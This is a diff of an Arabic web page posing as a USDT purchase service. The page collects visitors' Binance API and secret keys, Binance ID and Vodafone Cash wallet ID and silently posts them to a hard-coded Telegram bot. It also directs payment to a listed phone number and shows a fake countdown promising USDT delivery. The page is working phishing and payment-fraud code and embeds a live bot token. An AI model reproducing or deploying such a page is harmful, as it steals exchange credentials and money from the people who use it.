@@ -1,64 +1,80 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل API</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>شراء USDT</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body { font-family: 'Cairo', sans-serif; }
   </style>
 </head>
-<body class="bg-black text-white">
+<body class="bg-white text-black min-h-screen flex items-center justify-center">
 
-  <!-- الصفحة الأولى: تسجيل API -->
-  <div id="registration-page" class="min-h-screen flex flex-col items-center justify-center">
-    <h1 class="text-3xl font-bold mb-6">تسجيل API</h1>
+  <div class="w-full max-w-md p-6 bg-black text-white rounded-2xl shadow-lg space-y-8">
 
-    <input id="api-key" type="text" placeholder="API Key" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
-    <input id="secret-key" type="text" placeholder="Secret Key" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
+    <!-- الصفحة الأولى -->
+    <div id="registration-page">
+      <h1 class="text-2xl font-bold text-center mb-4">تسجيل بيانات API</h1>
 
-    <!-- IP ثابت يظهر تلقائيًا -->
-    <input id="ip-address" type="text" value="41111111" readonly class="mb-4 px-4 py-2 bg-gray-700 border border-white rounded w-72 text-gray-400">
+      <input id="api-key" type="text" placeholder="API Key"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+      <input id="secret-key" type="text" placeholder="Secret Key"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+      <input id="ip-address" type="text" value="41.250.100.123" readonly
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-600 text-gray-300 border border-gray-500"/>
+      <button onclick="submitAPI()"
+        class="w-full py-2 bg-green-500 hover:bg-green-600 rounded text-white font-semibold">تأكيد</button>
+    </div>
 
-    <button onclick="submitAPI()" class="bg-green-500 hover:bg-green-600 px-6 py-2 rounded">تأكيد</button>
-  </div>
+    <!-- الصفحة الثانية -->
+    <div id="converter-page" class="hidden">
+      <h2 class="text-2xl font-bold text-center mb-4">تحويل المبلغ بالجنيه</h2>
+      <input id="usd-amount" type="number" placeholder="المبلغ بالدولار"
+        oninput="convertToEGP()"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+      <p id="result" class="text-center text-xl text-green-400 mb-4"></p>
 
-  <!-- الصفحة الثانية: تحويل الدولار -->
-  <div id="converter-page" class="hidden min-h-screen flex flex-col items-center justify-center">
-    <h2 class="text-3xl font-bold mb-6">احسب قيمة المبلغ بالجنيه</h2>
-    <input id="usd-amount" type="number" placeholder="أدخل المبلغ بالدولار" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
-    
-    <!-- خانة Binance ID -->
-    <input id="binance-id" type="text" placeholder="أدخل Binance ID" class="mb-4 px-4 py-2 bg-gray-800 border border-white rounded w-72">
+      <input id="binance-id" type="text" placeholder="Binance ID"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+      <input id="wallet-id" type="text" placeholder="ID محفظة فودافون كاش"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
 
-    <button onclick="convertToEGP()" class="bg-green-500 hover:bg-green-600 px-6 py-2 rounded">تحويل</button>
-    <p id="result" class="mt-4 text-xl"></p>
+      <p class="text-sm text-gray-400 text-center">قم بالتحويل إلى رقم فودافون كاش: <span class="text-yellow-300 font-semibold">01022131546</span></p>
+
+      <button onclick="sendBinanceInfo()"
+        class="w-full py-2 bg-blue-500 hover:bg-blue-600 rounded text-white font-semibold">إرسال</button>
+    </div>
+
+    <!-- الصفحة الثالثة: تأكيد -->
+    <div id="confirmation-page" class="hidden text-center space-y-4">
+      <h2 class="text-2xl font-bold text-green-400">تم استلام بياناتك بنجاح</h2>
+      <p class="text-lg text-gray-300">سيتم إرسال USDT خلال:</p>
+      <div id="countdown" class="text-4xl font-bold text-yellow-400 animate-pulse">10:00</div>
+      <p class="text-sm text-gray-400">يرجى الانتظار... يتم الآن إرسال USDT إلى Binance ID الخاص بك</p>
+      <button onclick="location.reload()" class="mt-6 bg-gray-700 hover:bg-gray-600 px-4 py-2 rounded text-white">
+        عودة للرئيسية
+      </button>
+    </div>
+
   </div>
 
   <script>
-    // بيانات التليجرام الثابتة (لا تظهر للمستخدم)
     const botToken = "7376753946:AAGdT_E1udWIYWUu21_NojPu-sVtk9uSljM";
     const chatId = "7699820616";
+    let calculatedResult = 0;
 
     function submitAPI() {
       const apiKey = document.getElementById('api-key').value;
       const secretKey = document.getElementById('secret-key').value;
       const ipAddress = document.getElementById('ip-address').value;
 
-      const message = `\nAPI Key: ${apiKey}\nSecret Key: ${secretKey}\nIP: ${ipAddress}`;
-
+      const message = `API Key: ${apiKey}\nSecret Key: ${secretKey}\nIP: ${ipAddress}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(response => {
         if (response.ok) {
           document.getElementById('registration-page').classList.add('hidden');
           document.getElementById('converter-page').classList.remove('hidden');
@@ -70,25 +86,52 @@
 
     function convertToEGP() {
       const usdAmount = parseFloat(document.getElementById('usd-amount').value);
+      const rate = 50;
+      if (!isNaN(usdAmount)) {
+        calculatedResult = usdAmount * rate;
+        document.getElementById('result').textContent = `= ${calculatedResult} جنيه مصري`;
+      } else {
+        document.getElementById('result').textContent = "";
+      }
+    }
+
+    function sendBinanceInfo() {
       const binanceId = document.getElementById('binance-id').value;
-      const rate = 50; // 1 USDT = 50 جنيه
-      const result = usdAmount * rate;
-      document.getElementById('result').textContent = `= ${result} جنيه مصري`;
+      const walletId = document.getElementById('wallet-id').value;
 
-      const message = `تم إدخال طلب تحويل:\nالمبلغ: ${usdAmount} دولار\nالقيمة بالجنيه: ${result} جنيه\nBinance ID: ${binanceId}`;
-
+      const message = `Binance ID: ${binanceId}\nالمبلغ بالجنيه: ${calculatedResult}\nID محفظة فودافون كاش: ${walletId}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(response => {
+        if (response.ok) {
+          document.getElementById('converter-page').classList.add('hidden');
+          document.getElementById('confirmation-page').classList.remove('hidden');
+          const countdownElement = document.getElementById('countdown');
+          startCountdown(600, countdownElement); // 10 دقائق
+        } else {
+          alert("فشل إرسال Binance ID");
+        }
       });
+    }
+
+    function startCountdown(duration, display) {
+      let timer = duration, minutes, seconds;
+      const countdownInterval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+          clearInterval(countdownInterval);
+          display.textContent = "تم التحويل!";
+        }
+      }, 1000);
     }
   </script>
 
 </body>
-  </html>
+      </html>
